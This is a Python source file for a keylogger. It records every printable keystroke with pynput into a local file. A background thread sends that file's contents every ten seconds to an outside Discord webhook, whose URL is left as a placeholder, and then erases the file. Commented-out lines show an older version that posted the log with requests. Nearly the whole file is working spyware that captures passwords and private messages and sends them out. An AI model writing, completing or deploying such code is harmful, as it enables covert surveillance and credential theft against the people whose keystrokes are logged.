from pynput import keyboard
from dhooks import Webhook
import threading
#import requests
#import json
import time
#----------------------------------------------------------------------
#multithreading
#rdm_sec = [500,600,700,800,900]
# This function runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return


    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)


#----------------------------------------------------------------------

def llistener():

    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

#----------------------------------------------------------------------
#send content of file function

hook = Webhook (" web hook here")

def send():
    while True:
        print("send loop")


        with open("keylog.txt", "r") as file:
            content = file.read()
        if not content.strip():
            print("go back")
            continue
        # data = "hello world test!"
        hook.send(content)
        print("sent")
        with open("keylog.txt", "r+") as con:
            print("erased")
            con.seek(0)
            con.truncate()
        time.sleep(10)


#    time.sleep(300)

#----------------------------------------------------------------------


thread1 = threading.Thread(target=llistener, daemon=True)
thread2 = threading.Thread(target=send, daemon=True)
    # Start the threads
thread1.start()
thread2.start()
    # wait for both threads to finish
#    thread1.join()
#    thread2.join()

while True:
     pass

#start_time = time.time()

#while True:


#    llistener()


#    if time.time() - start_time >= 100:
#        send()
#        start_time = time.time()






#    json = {"content": content}
        # send only if file has contents
#    if not content.strip():
#     return



#    response = requests.post(webhook, json=json)
#    print(response.json())


    # delete contents of file
#    if response.status_code == 204:
#        with open("keylog.txt", "r+") as con:
#            con.seek(0)
#            con.truncate()




#--execute send_file function here
#while True:
#    send_file()
#    time.sleep(100)  # 300 sec. 5 minutes








